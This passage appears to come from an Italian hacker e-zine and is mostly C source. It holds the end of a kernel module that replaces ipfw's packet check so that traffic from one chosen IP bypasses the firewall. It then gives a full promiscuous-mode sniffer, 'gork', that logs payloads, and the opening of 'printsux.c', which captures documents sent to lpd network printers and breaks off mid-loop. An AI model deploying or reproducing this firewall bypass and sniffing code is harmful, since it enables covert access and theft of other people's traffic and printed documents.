+			if (f->fw_reject_code == IP_FW_REJECT_RST)
+				printf("Reset");
+			else
+				printf("Unreach");
+			break;
+		case IP_FW_F_ACCEPT:
+			printf("Accept");
+			break;
+		case IP_FW_F_COUNT:
+			printf("Count");
+			break;
+		case IP_FW_F_DIVERT:
+			printf("Divert %d", f->fw_divert_port);
+			break;
+		case IP_FW_F_TEE:
+			printf("Tee %d", f->fw_divert_port);
+			break;
+		case IP_FW_F_SKIPTO:
+			printf("SkipTo %d", f->fw_skipto_rule);
+			break;
+		case IP_FW_F_PIPE:
+			printf("Pipe %d", f->fw_skipto_rule);
+			break;
+		case IP_FW_F_FWD:
+			printf("Forward to ");
+			print_ip(f->fw_fwd_ip.sin_addr);
+			if (f->fw_fwd_ip.sin_port)
+				printf(":%d", f->fw_fwd_ip.sin_port);
+			break;
+		default:	
+			printf("UNKNOWN");
+			break;
+		}
+	printf(" ");
+
+	switch (ip->ip_p) {
+	case IPPROTO_TCP:
+		printf("TCP ");
+		print_ip(ip->ip_src);
+		if ((ip->ip_off & IP_OFFMASK) == 0)
+			printf(":%d ", ntohs(tcp->th_sport));
+		else
+			printf(" ");
+		print_ip(ip->ip_dst);
+		if ((ip->ip_off & IP_OFFMASK) == 0)
+			printf(":%d", ntohs(tcp->th_dport));
+		break;
+	case IPPROTO_UDP:
+		printf("UDP ");
+		print_ip(ip->ip_src);
+		if ((ip->ip_off & IP_OFFMASK) == 0)
+			printf(":%d ", ntohs(udp->uh_sport));
+		else
+			printf(" ");
+		print_ip(ip->ip_dst);
+		if ((ip->ip_off & IP_OFFMASK) == 0)
+			printf(":%d", ntohs(udp->uh_dport));
+		break;
+	case IPPROTO_ICMP:
+		if ((ip->ip_off & IP_OFFMASK) == 0)
+			printf("ICMP:%u.%u ", icmp->icmp_type, icmp->icmp_code);
+		else
+			printf("ICMP ");
+		print_ip(ip->ip_src);
+		printf(" ");
+		print_ip(ip->ip_dst);
+		break;
+	default:
+		printf("P:%d ", ip->ip_p);
+		print_ip(ip->ip_src);
+		printf(" ");
+		print_ip(ip->ip_dst);
+		break;
+	}
+	if (oif)
+		printf(" out via %s%d", oif->if_name, oif->if_unit);
+	else if (rif)
+		printf(" in via %s%d", rif->if_name, rif->if_unit);
+	if ((ip->ip_off & IP_OFFMASK)) 
+		printf(" Fragment = %d",ip->ip_off & IP_OFFMASK);
+	printf("\n");
+	if (fw_verbose_limit != 0 && count == fw_verbose_limit)
+		printf("ipfw: limit reached on rule #%d\n",
+		f ? f->fw_number : -1);
+    }
+}
+
+u_int32_t inaton(const char *str)
+{
+	unsigned long l;
+	unsigned int val;
+	int i;
+
+	l = 0;
+
+	for(i=0; i < 4; i++) {
+		l <<= 8;
+		if(*str != '\0') {
+			val = 0;
+			while(*str != '\0' && *str != '.') {
+				val *= 10;
+				val += *str - '0';
+				str++;
+			}
+			l |= val;
+			if(*str != '\0')
+				str++;
+		}
+	}
+	return(htonl(l));
+}
+
+---------- snip ----------
+
+Come funziona ?
+
+In pratica il mio kld rimpiazza la funzione del check dei pacchetti di ipfw
+con una simile ... che pero' quando c'e' da prendere l'azione controlla prima
+se l'ip era quello specificato in IP_FW_FILTER, se si bypassa l'azione del
+fw uscendo prima che il fw possa bloccare la nostra connessione con la
+tcp_respond() con RST passato o icmp_error() con codice unreachable... 
+
+
+meditate gente, meditate
+
+pIGpEN`79 the haphazard deadhead
+
+
+-------------------------------------------------------------------------------
+----------------------------------[ MISC ]-------------------------------------
+-------------------------------------------------------------------------------
+
+Questa versione e' gia' stata messa sul sito del softpj...
+per chi ancora ha la versione di bfi7 ecco qui la nuova e probabilmente ultima
+
+---------- snip ----------
+
+/*
+ * G o r k   -  U n i x   P a c k e t   L o g g e r
+ * 
+ * v e r s i o n  2.0b - bugs fixed
+ * 
+ * Questo sorgente non e' coperto da nessun copyright e come tale potete farci
+ * quello che volete... visto che non arrichisce le mie tasche potete
+ * tranquillamente rubarlo all'autore che tanto a lui non gliene frega un
+ * cazzo... ne' io, ne' il ladro ci possiamo ritenere responsabili di quello
+ * che fate con questo sorgente... 
+ *
+ * Compile with: gcc gork.c -O4 -Wall -lpcap
+ *
+ * Tested on:
+ * 	Linux RedHat 6.X     ( mail.cameretta.pig )
+ *	Linux Debian 2.0r3   ( porcellino.cameretta.pig ) 
+ *      FreeBSD 4.0          ( sp00f.y0ur.life.cameretta.pig )
+ *
+ * - Now it logs correctly 
+ *
+ * pIGpEN [pigpen@s0ftpj.org]
+ */
+
+/*
+ * Questa e' la versione che permette di loggare i pacchetti rispetto alla 
+ * versione pubblicata su bfi 7:
+ *
+ * - e' stata corretta la hostLookup()
+ * - HST_FOUND viene inizializzata dentro il ciclo in modo da permettere di
+ *   loggare solo sui files giusti
+ * - il codice e' stato identato come dio bit comanda e sono state tolte 
+ *   alcune parti superflue tra cui una variabile in piu' utilizzata per
+ *   leggere l'header pcap
+ *
+ * non ci saranno versioni successive
+ */
+
+
+// CONFIGURATION 
+
+/*
+ * DONT_LOOKUP -> if you have problems with gork & your dns
+ * SYSTEM_LOG  -> Log gork msg via syslog warning this can give problems
+ * PROMISC     -> 1 to activate it 0 if you wanna see only your box pkts
+ */
+
+#define PROMISC 1
+ 
+/* 
+ *
+ * G o R K  a porting of Timothy Leary on your Box ... ;)
+ * 
+ */
+ 
+#include 		<stdio.h>
+#include 		<netdb.h>
+#include 		<string.h>
+#include 		<stdlib.h>
+#include 		<unistd.h>
+#include 		<sys/ioctl.h>
+#include 		<sys/types.h>
+#include 		<sys/time.h>
+#include 		<sys/signal.h>
+#include 		<sys/socket.h>
+#include		<netinet/in_systm.h>
+#include 		<netinet/in.h>
+#include 		<pcap.h>		
+#if (linux)
+#define __FAVOR_BSD
+#endif
+#include		<netinet/ip.h>
+#include		<netinet/ip_icmp.h>
+#include		<netinet/udp.h>
+#include		<arpa/inet.h>
+#include		<arpa/nameser.h>
+
+#ifdef SYSTEM_LOG
+#include		<syslog.h>
+#endif
+
+#define			CONF		"gork.conf"
+#define			LOG_TYPE	4	//syslog
+
+#define			SYSLOG_PORT	514
+#define			MTU		1500
+#define			URG		32
+#define			ACK_PSH		24
+#define			SYN_ACK		18
+#define			FIN_ACK		17
+#define			ACK		16
+#define                 PSH             8
+#define                 RST             4
+#define                 SYN             2
+#define         	FIN             1
+
+
+#define			WHITE		printf("\033[0;29m")
+#define                 RED             printf("\033[1;31m")
+#define         	GREEN           printf("\033[1;32m")
+#define		        YELLOW          printf("\033[1;33m")
+#define			BLUE		printf("\033[1;34m")
+#define			MAGENTA		printf("\033[1;35m")
+#define         	CYAN            printf("\033[1;36m")
+#define			RETURN		printf("\n")
+#define			CLEAR		printf("\033[2J\033[1;1H")
+#define			LINE		printf("<\033[1;32m-----\033[1;34m>\n");
+
+#define 		ADDR_DIM	255	
+#define			LOG_ALL		"all_g0rk.log"
+#define			LOG_SL		"gork.syslog"
+
+unsigned char 		s_addr[ADDR_DIM];
+unsigned char   	d_addr[ADDR_DIM];
+char 			*hst_saddr=NULL;
+char 			*hst_daddr=NULL;
+time_t 			now;
+char 			date[60];
+int 			port=0;
+char			*syslog_string;
+
+extern char 		*optarg;
+
+pcap_t 		        *pcap_global_descriptor;
+char           		*deviceglobal=NULL;
+int            		offset;
+
+struct packet_info{
+	unsigned char ttl, protocol, version;
+	unsigned char *saddr, *daddr;
+	unsigned long seq, ack_seq;
+	unsigned short source, dest, type, id, flags, window;
+	char dataload[MTU];
+};
+
+struct DNSpkt {
+ HEADER head;
+ char query[255];
+};
+
+struct TCPhdr {
+ u_short source, dest;
+ u_int32_t seq, ack_seq;
+ u_short offset_flag, window, checksum, urgent;
+};
+
+int 		main 			__P((int, char **));
+void 		usage 			__P((char *));
+void 		scan 			__P((struct packet_info));
+void 		fuckin_about_all_day 	__P((void));
+void 		print_addr 		__P((struct packet_info));
+void 		pcap_device_on 		__P((void));
+void 		sniff_pk 		__P((struct packet_info *));
+void 		ethclose 		__P(());
+void 		dump_tcp 		__P((struct packet_info, int));
+void 		dump_udp 		__P((struct packet_info));
+void 		dump_icmp 		__P((struct packet_info));
+
+#ifndef DONT_LOOKUP
+
+char 		*hostLookup 		__P((struct in_addr));
+
+char *hostLookup(struct in_addr in)
+{
+ struct hostent *hostEnt;
+
+ if((hostEnt=gethostbyaddr((char *)&in, sizeof(struct in_addr), AF_INET)))
+	 return (strdup(hostEnt->h_name));
+ 	 return NULL;
+}
+
+#endif
+
+
+void usage(char *arg)
+{
+ YELLOW;
+ printf("\t\t\t  pIGpEN - diGiTaL dEAdhEAd -");
+ BLUE;
+ printf("\n\n\nPut hostname/ip in gork.conf ... \nUse ");
+ MAGENTA;
+ printf("-p dest_port ");
+ BLUE;
+ printf("if you wanna log only packets to dest_port\n and with ip/hostname in");
+ MAGENTA;
+ printf(" gork.conf\n");
+ BLUE;  
+ printf("To log all source ip put in gork.conf: ");
+ MAGENTA;
+ printf(".\n");
+ printf("-l string ");
+ BLUE;
+ printf("write in gork.syslog if <string> was found in syslog messages\n");
+ printf("Other options: \n");
+ printf("		-i interface\n");
+ printf("		-v verbose mode for tcp\n");
+ WHITE;
+}
+
+void fuckin_about_all_day(void)
+{
+ CLEAR;
+ fflush(stdout); sleep(1);
+ printf("\033[1;35m     .g#S$'$S#n.\n");
+ printf("\033[1;35m     $$$$$ $$$$'\n");
+ printf("\033[1;35m     $$$$$\n");
+ printf("\033[1;35m     `$$$$$$$$$n\n");
+ printf("\033[1;34m           $$$$$\n");
+ printf("\033[1;34m     $$$$$ $$$$$\n");
+ printf("\033[1;34m     `$$$$s$$$S'\n\n");
+ fflush(stdout); sleep(1);
+ printf("\033[1;35m     .g#S$'$S#n.\n");
+ printf("\033[1;35m     $$$$$ $$$$$\n");
+ printf("\033[1;35m     $$$$$ $$$$$\n");
+ printf("\033[1;35m     $$$$$ $$$$$\n");
+ printf("\033[1;34m     $$$$$s$$$$'\n");
+ printf("\033[1;34m     $$$$$      \n");
+ printf("\033[1;34m     $$$$       \n");
+ fflush(stdout); sleep(1);
+ printf("\033[1;35m            S#n.\n");
+ printf("\033[1;35m            $$$$\n");
+ printf("\033[1;35m            $$$$\n");
+ printf("\033[1;35m            $$$$\n");
+ printf("\033[1;34m            $$$$\n");
+ printf("\033[1;34m      $$$$$ $$$$\n");
+ printf("\033[1;34m      `$$$$s$$S'\n\n");
+ fflush(stdout); sleep(1);
+
+ MAGENTA;
+ printf("\033[15A\t\t\t\t     _____________________\n");
+ fflush(stdout); sleep(1);
+ printf("\033[01A\t\t\t\t     s o f t p r o j e c t\n\n");
+ fflush(stdout); sleep(1);
+ BLUE;
+ printf("\t\t\t  ____________________________________________\n\n");
+ fflush(stdout); sleep(1);
+ printf("\t\t\t\033[02A  d i g i t a l  s e k u r i t y  f o r  y 2 k\n\n");
+ fflush(stdout); sleep(1);
+ printf("\t\t\t\t  ___________________________\n");
+ fflush(stdout); sleep(1);
+ printf("\t\t\t\t\033[01A  w w w . s 0 f t p j . o r g\n");
+ fflush(stdout); sleep(1);
+ sleep(3);
+ CLEAR;
+}
+
+void print_addr(struct packet_info infoz)
+{
+ struct servent  *service = NULL;
+ struct protoent *proto   = NULL;
+ struct in_addr  in_a;
+ int yes_lookup=0;
+ 
+ now=time(NULL);
+ strftime(date,60,"%H:%M:%S %a %h %d", localtime(&now));
+
+ bzero(s_addr,sizeof(s_addr)); 
+ bzero(d_addr,sizeof(d_addr));
+ hst_daddr=NULL;
+ hst_saddr=NULL;
+ 
+ sprintf(s_addr,"%u.%u.%u.%u",
+            	infoz.saddr[0],
+                infoz.saddr[1],
+                infoz.saddr[2],
+                infoz.saddr[3]);
+
+ sprintf(d_addr,"%u.%u.%u.%u",
+                infoz.daddr[0],
+                infoz.daddr[1],
+                infoz.daddr[2],
+                infoz.daddr[3]);
+ 
+ GREEN; 	printf("%s\n",date);
+ BLUE; 		printf("%s",s_addr);
+ GREEN;		printf(" -> ");
+ MAGENTA;	printf("%s",d_addr);
+
+ if(infoz.protocol!=IPPROTO_ICMP) { 
+  if((proto=getprotobynumber(infoz.protocol))) { 
+   BLUE;	   
+   if((service=getservbyport(infoz.source,proto->p_name)))
+  		printf(" %s",service->s_name);
+   else 	printf(" %d",infoz.source);
+   YELLOW; 	printf(" / ");
+   MAGENTA;
+   if((service=getservbyport(infoz.dest,proto->p_name)))
+    		printf("%s",service->s_name);
+   else 	printf("%d",infoz.dest);
+  }
+ }
+
+ 
+#ifndef DONT_LOOKUP 
+ BLUE; 
+
+ // limit shit for dns ... invoked with gethostbyaddr() 
+ // you can change it as you want ...
+  
+ switch(infoz.protocol) { 
+  case IPPROTO_TCP:
+	   	     if(infoz.flags==SYN)
+	              yes_lookup=1;
+		     break;
+  case IPPROTO_UDP:
+		     if(infoz.source != NAMESERVER_PORT &&
+		        infoz.dest   != NAMESERVER_PORT)
+		      yes_lookup=1;
+		     break;
+  case IPPROTO_ICMP:
+		     yes_lookup=1;
+		     break;
+ }		  
+  
+ if(yes_lookup) {
+  RETURN;	
+  
+  inet_aton((char *)s_addr, &in_a);
+  if(!(hst_saddr=hostLookup(in_a)))
+  		printf("none -> ");
+  else
+  		printf("%s -> ",hst_saddr);
+ 
+  MAGENTA;
+		   
+  inet_aton((char *)d_addr, &in_a);
+  if(!(hst_daddr=hostLookup(in_a)))
+  		printf("none");
+  else
+  		printf("%s",hst_daddr);
+ }  
+#endif
+ MAGENTA; RETURN;
+ scan(infoz);	
+}
+
+
+
+void scan(struct packet_info infoz)
+{
+ FILE *iff, *of;
+ char buf[512];
+ char o[400],tmp_port[10]; 
+ char *flags=NULL;
+ int HST_FOUND=0;
+
+ if(!(iff=fopen(CONF,"r")))
+   return;
+ while(fgets(buf,512,iff)) {
+  if(buf[strlen(buf)-1]=='\n')
+   buf[strlen(buf)-1]=0;
+
+  HST_FOUND = 0;
+  
+  if(infoz.version!=4) {
+   CLEAR;
+   printf("No IPv4\n");
+   exit(-1);
+  } 
+
+  if(port && infoz.dest!=port && infoz.source!=port)
+   return;
+
+  if(port && (infoz.protocol==IPPROTO_ICMP))
+   return;  
+
+  if(hst_saddr) {
+   if(strstr(hst_saddr,buf)) 
+    HST_FOUND=1;
+  }
+			
+  if(hst_daddr) {	
+   if(strstr(hst_daddr,buf))
+   HST_FOUND=1;
+  }
+
+    
+  if( strstr(s_addr, buf) || strstr(d_addr, buf) || HST_FOUND ) {	
+#ifdef SYSTEM_LOG
+   syslog(LOG_TYPE,"G0RK: My lord %s is here ... I log it", s_addr);
+#endif
+   if(buf[0]=='.' && buf[1]=='\0')
+    of=fopen(LOG_ALL,"a");
+   else
+    (buf[0]=='.') ? bcopy(buf+1,o,sizeof(o)) : bcopy(buf,o,sizeof(o));
+   if(port) { sprintf(tmp_port,":%d",port); strncat(o,tmp_port,sizeof(o)); }
+   of=fopen(o,"a+");
+   if(!of) {
+    CLEAR;
+    printf("Can't open %s file\n\n\n",buf);
+    return ;
+   }
+   fprintf(of,"<--->\n");
+   fprintf(of,"date: %s\n",date);
+   fprintf(of,"src:%s (%s)\ndst:%s (%s)\n",s_addr,hst_saddr,d_addr,hst_daddr);
+   if((infoz.protocol)!=IPPROTO_ICMP)
+    fprintf(of,"port: %d:%d\n",infoz.source,infoz.dest);
+    
+   switch(infoz.protocol) {
+    case IPPROTO_ICMP:
+     fprintf(of,"type: ");
+     switch((infoz.type)/256) {
+      case 0:
+       fprintf(of,"icmp echo reply\n");
+       break;
+      case 3:
+       fprintf(of,"icmp dest_unreach\n");
+       break;
+      case 4:
+       fprintf(of,"icmp source quench\n");
+       break;
+      case 5:
+       fprintf(of,"icmp redirect\n");
+       break;
+      case 8:
+       fprintf(of,"icmp echo\n");
+       break;
+      case 11:
+       fprintf(of,"icmp time exceeded\n");
+       break;
+      case 12:
+       fprintf(of,"icmp parameter problem\n");
+       break;
+      case 13:
+       fprintf(of,"icmp timestamp\n");
+       break;
+      case 14:
+       fprintf(of,"icmp timestamp reply\n");
+       break;
+      case 15:
+       fprintf(of,"icmp information\n");
+       break;
+      case 16:
+       fprintf(of,"icmp information reply\n");
+       break;
+      case 17:
+       fprintf(of,"icmp address mask\n");
+       break;
+      case 18:
+       fprintf(of,"icmp address mask reply\n");
+       break;
+      default:
+       fprintf(of,"icmp type %i\n", infoz.type);
+       break;
+     }
+     break;  
+	
+    case IPPROTO_TCP:
+     fprintf(of,"seq #: %u\n",(unsigned int) infoz.seq);
+     fprintf(of,"ack #: %u\n",(unsigned int) infoz.ack_seq);
+     fprintf(of,"ttl: %i\n",infoz.ttl);
+     fprintf(of,"win: %i\n",infoz.window);
+     
+     switch (infoz.flags) {
+      case URG:
+       flags="-----U";
+       break;
+      case ACK_PSH:
+       flags="---PA-";
+       break;
+      case SYN_ACK:
+       flags="-S--A-";
+       break;
+      case FIN_ACK:
+       flags="F---A-";
+       break;
+      case ACK:
+       flags="----A-";
+       break;
+      case PSH:
+       flags="---P--";
+       break;
+      case RST:
+       flags="--R---";
+       break;
+      case SYN:
+       flags="-S----";
+       break;
+      case FIN:
+       flags="F-----";
+       break;
+     }
+     fprintf(of,"flags %s\n",flags);	
+     break;
+    case IPPROTO_UDP:
+     if(infoz.dest==SYSLOG_PORT && port!=SYSLOG_PORT)
+      fprintf(of,"SYSLOG DATA: %s\n",infoz.dataload); 
+     break;
+   }	
+    
+   buf[strlen(buf)+1]=0;
+   buf[strlen(buf)]='\n';
+   fclose(of);
+  }
+ }
+ fclose(iff);
+}
+
+void pcap_device_on(void)
+{
+ char            errbuf[400];
+ int datalink;
+
+ if (!deviceglobal || !strcmp(deviceglobal, "default")) {
+  deviceglobal=pcap_lookupdev(errbuf);
+  printf("Device ->");
+  GREEN;
+  printf(" %s.\n\n", deviceglobal);
+ }
+
+ if (!deviceglobal) {
+  printf("Error getting device - %s\n", errbuf);
+  exit(1);
+ }
+
+ pcap_global_descriptor =
+  pcap_open_live(deviceglobal, 68, PROMISC, 1000, errbuf);
+
+ if (!pcap_global_descriptor) {
+  printf("error opening pcap: %s\n", errbuf);
+  exit(1);
+ }
+
+ datalink = pcap_datalink(pcap_global_descriptor);
+
+ switch (datalink) {
+  case DLT_EN10MB:
+                  offset = 14;
+                  break;
+  case DLT_NULL:
+  case DLT_PPP:	
+                  offset = 4;
+                  break;
+  case DLT_SLIP:
+                  offset = 16;
+                  break;
+  case DLT_RAW:
+		  offset = 0;
+		  break;
+  case DLT_SLIP_BSDOS:
+  case DLT_PPP_BSDOS:
+		  offset = 24;
+		  break;
+  default:
+                  printf("unknown datalink type (%d)", datalink);
+                  exit(-1); 
+ }
+}
+
+
+void sniff_pk(struct packet_info *infoz)
+{
+ struct ip          *IP;
+ struct TCPhdr      *TCP;
+ struct udphdr      *UDP;
+ struct icmp        *ICMP;
+ struct pcap_pkthdr lpcap_hdr;
+ char 	*sniff_buff;
+
+ bzero(s_addr, sizeof(s_addr));
+ bzero(d_addr, sizeof(d_addr));
+
+ if((sniff_buff=(char *) pcap_next(pcap_global_descriptor, &lpcap_hdr))){
+  (char *) sniff_buff+=offset;
+  IP = (struct ip *) sniff_buff;
+  infoz->ttl = IP->ip_ttl;
+  infoz->protocol = (char)IP->ip_p;
+  infoz->version  = (char)IP->ip_v;
+  infoz->saddr = (unsigned char *)&(IP->ip_src.s_addr);
+  infoz->daddr = (unsigned char *)&(IP->ip_dst.s_addr);
+
+  switch (infoz->protocol) {
+   case IPPROTO_TCP:
+    TCP = (struct TCPhdr *)(sniff_buff+sizeof(*IP));
+    infoz->seq     = ntohl(TCP->seq);
+    infoz->ack_seq = ntohl(TCP->ack_seq);
+    infoz->source  = ntohs(TCP->source);
+    infoz->dest    = ntohs(TCP->dest);
+    infoz->window  = ntohs(TCP->window);
+    infoz->flags   = ntohs(TCP->offset_flag)&
+     (URG|ACK|PSH|FIN|RST|SYN);
+    memcpy(infoz->dataload,
+           sniff_buff + sizeof(struct ip) + sizeof(struct TCPhdr),
+           ntohs(IP->ip_len)-sizeof(struct ip)-sizeof(struct TCPhdr));
+    break;
+   case IPPROTO_UDP:
+    UDP = (struct udphdr *)(sniff_buff+sizeof(*IP));
+    infoz->source = ntohs(UDP->uh_sport);
+    infoz->dest   = ntohs(UDP->uh_dport);
+    memcpy(infoz->dataload,
+           sniff_buff + sizeof(struct ip) + sizeof(struct udphdr),
+           ntohs(IP->ip_len)-sizeof(struct ip)-sizeof(struct udphdr));
+    break;
+   case IPPROTO_ICMP:
+    ICMP = (struct icmp *)(sniff_buff+sizeof(*IP));
+    infoz->type = ntohs(ICMP->icmp_type);
+    infoz->id   = ntohs(ICMP->icmp_seq);
+    break;
+  }
+ }
+}
+
+
+void ethclose()
+{
+ if(pcap_global_descriptor) pcap_close(pcap_global_descriptor);
+ MAGENTA;
+ printf("I will getby ... I will survive...\n");
+ WHITE;
+ exit(0);
+}
+
+
+void dump_tcp(struct packet_info info, int data)
+{
+ char *flags=NULL;
+
+ print_addr(info);
+ MAGENTA;
+ printf("TCP ");
+ BLUE;
+ printf("%u:", (unsigned int) info.seq);
+ MAGENTA;
+ printf("%u", (unsigned int) info.ack_seq);
+ MAGENTA; printf("\tTTL: ");
+ BLUE;    printf("%i ", info.ttl);
+ MAGENTA; printf("\tWin: ");
+ BLUE;    printf("%i", info.window);	
+ 
+ switch (info.flags) {
+  case URG:
+   flags="-----\033[1;32mU\033[1;34m";
+   break;
+  case ACK_PSH:
+   flags="---\033[1;32mPA\033[1;34m-";
+   break;
+  case SYN_ACK:
+   flags="-\033[1;32mS\033[0;34m--\033[1;32mA\033[1;34m-";
+   break;
+  case FIN_ACK:
+   flags="\033[1;32mF\033[1;34m---\033[1;32mA\033[1;34m-";
+   break;
+  case ACK:
+   flags="----\033[1;32mA\033[1;34m-";
+   break;
+  case PSH:
+   flags="---\033[1;32mP\033[1;34m--";
+   break;
+  case RST:
+   flags="--\033[1;32mR\033[1;34m---";
+   break;
+  case SYN:
+   flags="-\033[1;32mS\033[1;34m----";
+   break;
+  case FIN:
+   flags="\033[1;32mF\033[1;34m-----";
+   break;
+ }
+
+ MAGENTA;  printf("     FLAGS: ");
+ BLUE; printf("%s\n",flags);
+ if(data && (info.flags==PSH || info.flags==ACK_PSH)) {
+   BLUE;   printf("-> ");
+   GREEN;  printf("%s\n",info.dataload);
+ }
+ LINE;
+}
+
+
+
+void dump_udp(struct packet_info info)
+{
+ FILE *fp_sl;
+ struct DNSpkt *dns_pkt;
+
+ print_addr(info);
+ printf("UDP ");
+
+ if(info.dest==SYSLOG_PORT && port!=SYSLOG_PORT) {
+  GREEN; 
+  printf("%s", info.dataload);
+  if(syslog_string && info.dataload) {
+   if(strstr(info.dataload,syslog_string)) {
+    RED;
+    printf("\tMSG LOGGED -> %s\n",LOG_SL);
+    fp_sl=fopen(LOG_SL,"a");
+    now=time(NULL);
+    strftime(date,60,"%H:%M:%S %a %h %d", localtime(&now));
+    fprintf(fp_sl,"\n%s --- str -> %s\n",date,syslog_string); 
+    fprintf(fp_sl,"%s -> %s == %s\n", 
+                   s_addr,
+                   d_addr,
+                   info.dataload);
+    fclose(fp_sl);
+   }
+  }
+ } 
+
+ if(info.source==NAMESERVER_PORT || info.dest==NAMESERVER_PORT) { 
+  dns_pkt=(struct DNSpkt *) info.dataload;
+ 
+  BLUE;		printf("\tRD: ");
+  MAGENTA;	printf("%d ",dns_pkt->head.rd);
+  BLUE;		printf("AA: ");
+  MAGENTA;	printf("%d ",dns_pkt->head.aa);
+  BLUE;		printf("OPCODE: ");
+  MAGENTA;
+  
+  switch(dns_pkt->head.opcode) {
+   case  QUERY: printf("QUERY ");  break;
+   case IQUERY: printf("IQUERY "); break;
+   case STATUS: printf("STATUS "); break;
+       default: printf("%d ",dns_pkt->head.opcode);  
+  }
+  
+  BLUE;		printf("QR: ");
+  MAGENTA;	printf("%d ",dns_pkt->head.qr);
+
+  BLUE;		printf("RA: ");
+  MAGENTA;	printf("%d ",dns_pkt->head.ra);
+  BLUE;		printf("AD: ");
+  MAGENTA;	printf("%d ",dns_pkt->head.ad);
+  BLUE;		printf("CD: ");
+  MAGENTA;	printf("%d",dns_pkt->head.cd);
+  BLUE;		printf("\tDNSPKT ID: ");
+  RED;		printf("%d",dns_pkt->head.id);
+ }
+ RETURN; BLUE; LINE;
+}
+
+
+
+void dump_icmp(struct packet_info info)
+{
+ print_addr(info);
+
+ MAGENTA; printf("ICMP ");
+ BLUE;	  printf("TYPE: ");
+ RED;
+ 
+ switch((info.type/256)) {
+  case 0:
+         printf("echo reply\t");
+         break;
+  case 3:
+         printf("dest_unreach\t");
+         break;
+  case 4:
+         printf("source quench\t");
+         break;
+  case 5:
+         printf("redirect\t");
+         break;
+  case 8:
+         printf("echo\t");
+         break;
+  case 11:
+         printf("time exceeded\t");
+         break;
+  case 12:
+         printf("parameter problem\t");
+         break;
+  case 13:
+         printf("timestamp\t");
+         break;
+  case 14:
+         printf("timestamp reply\t");
+         break;
+  case 15:
+         printf("information\t");
+         break;
+  case 16:
+         printf("information reply\t");
+         break;
+  case 17:
+         printf("address mask\t");
+         break;
+  case 18:
+         printf("address mask reply\t");
+         break;
+  default:
+         printf("%i\t", info.type);
+         break;
+ }
+
+ BLUE;
+ printf("(ttl:%i id:%i)\n", info.ttl, (info.id/256));
+ LINE;
+}
+
+
+int main(int argc, char **argv)
+{
+ int snoop = 0, opt;
+ struct packet_info pk_info;
+
+ signal(SIGINT,  ethclose);
+ signal(SIGTERM, ethclose);
+ signal(SIGKILL, ethclose);
+ signal(SIGQUIT, ethclose);
+ 
+ fuckin_about_all_day(); 
+
+ while ((opt = getopt(argc, (char **) argv, "vhp:l:i:")) != EOF) {
+  switch(opt) {
+   case 'v':
+            snoop=1;
+            break;
+   case 'h':
+    	    usage(argv[0]);
+	    exit(1);
+   case 'p':
+            if(syslog_string) {
+	     printf("Can't execute gork with -l & -p\n");
+	     WHITE;
+	     exit(1);
+	    }
+	    port=atoi(optarg);
+	    break;
+   case 'l':
+            if(port) {
+	     printf("Can't execute gork with -p & -l\n");
+	     WHITE;
+	     exit(1);
+	    } 
+            syslog_string=optarg;
+	    break;    
+   case 'i':
+            deviceglobal=optarg;
+            break;
+    default:
+            exit(1);
+  }
+ }
+
+ pcap_device_on();
+ 
+ while(1) {
+  bzero(&pk_info,sizeof(pk_info));
+  sniff_pk(&pk_info);
+
+  // add here other protocol implementations with their functions 
+  
+  switch(pk_info.protocol) {
+   case IPPROTO_TCP:
+                     dump_tcp(pk_info, snoop);
+                     break;
+   case IPPROTO_UDP:
+                     dump_udp(pk_info);
+                     break;
+   case IPPROTO_ICMP:
+                     dump_icmp(pk_info);
+                     break;
+  }
+ }
+}
+
+---------- snip ----------
+
+vi presento adesso un sorgente veramente semplice che cattura stampe remote
+mandate al demone lpd ...
+
+---------- snip ----------
+/*
+ * date:	 31-12-99 -- 13.31 
+ * filename:     printsux.c
+ * compile with: cc printsux.c -lpcap
+ * 
+ * This stupid src grabs documents printed on a network printer installed
+ * with lpd
+ *
+ * Don't use it for illegal purposes !
+ * It works only with normal hubs and without security layers :)
+ *
+ * QUESTO SORGENTE E' LIBERO COME L'ARIA POTETE MODIFICARLO, CAMBIARE ANCHE 
+ * IL NOME DELL'AUTORE E/O DEL FILE L'UNICO VINCOLO E' LA SINTASSI PROPRIA
+ * DEL LINGUAGGIO :D SI VIETA L'UTILIZZO PER SCOPI ILLEGALI.
+ * 
+ * Questo sorgente dimostra come sia facile in alcuni casi rubare documenti
+ * o altro stampato su una stampante collegata in rete ...
+ * Funziona nel caso in cui l'admin sia un gran pangonlino e in assenza di un
+ * hub switch... ovvio che funge solo su stampe remote... scusatemi se non 
+ * avevo voglia di rendere leggibile tutto il file grabbato ad ogni modo il
+ * documento e' ben visibile dal resto ...
+ *
+ * Questo stupido sorgente e' stato utilizzato per una dimostrazione legale 
+ * si vieta l'utilizzo per altri scopi.
+ *
+ * Per cocacola, caffe' di buona marca e concerti sono contattabile:
+ *
+ * pigpen [pigpen@s0ftpj.org] 
+ * 
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in_systm.h>
+#include <netinet/in.h>
+#include <pcap.h>
+
+#if (linux)
+#define __FAVOR_BSD
+#endif
+
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+#define PORT 	515 
+#define SUFFIX "grab"
+
+
+FILE 	*fp 	= NULL;
+pcap_t  *p_desc = NULL;
+
+
+void aroundaround()
+{
+	if(fp) 	    fclose(fp);
+	if(p_desc)  pcap_close(p_desc);
+	
+	exit(0);
+}	
+
+
+int main(void)
+{
+ char 		   filename[15];
+
+ char 		   *p_device, 
+		   *p_err = NULL, 
+		   *buff  = NULL;
+		   
+ int 		   datalink, 
+		   offset = 0, 
+		   count  = 0;
+
+ struct pcap_pkthdr p_hdr;
+ struct ip 	   *IP;
+ struct tcphdr 	   *TCP;
+
+
+ signal(SIGINT,  aroundaround);
+ signal(SIGTERM, aroundaround);
+ signal(SIGKILL, aroundaround);
+ signal(SIGQUIT, aroundaround);
+
+
+ if((p_device = pcap_lookupdev(p_err)))
+	printf("Interface -> %s\n", p_device);
+ else {
+	printf("%s\n", p_err);
+	return 0;
+ }
+	
+ if (!(p_desc = pcap_open_live(p_device, 68, 1, 1000, p_err))) {
+	printf("Error opening pcap: %s", p_err);
+	return 0;
+ }
+
+ datalink = pcap_datalink(p_desc);
+
+ switch(datalink) {
+	case DLT_EN10MB:
+		offset = 14;
+		break;
+
+	// put other types of datalink if you want ....
+ }
+
+ printf("Sniffing pkt ...\n");
+
+ while(1) {
+  if ((buff = (char *) pcap_next(p_desc, &p_hdr))) {
+   (char *) buff += offset;
+   IP = (struct ip *) buff;
+	
+   switch(IP->ip_p) {
